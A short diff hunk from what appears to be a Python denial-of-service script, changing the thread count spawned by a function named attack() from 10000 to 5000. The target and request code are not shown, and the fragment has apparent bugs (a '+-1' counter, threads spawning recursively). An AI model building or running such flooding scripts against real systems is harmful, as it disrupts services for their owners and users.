@@ -17,9 +17,9 @@ def attack():
     
     global already_connected
     already_connected +-1
-    if already_connected % 10000 == 0 :
+    if already_connected % 5000 == 0 :
       print(already_connected)
     
-    for i in range(10000):
+    for i in range(5000):
       thread = threading.Thread(target=attack)
       thread.start()
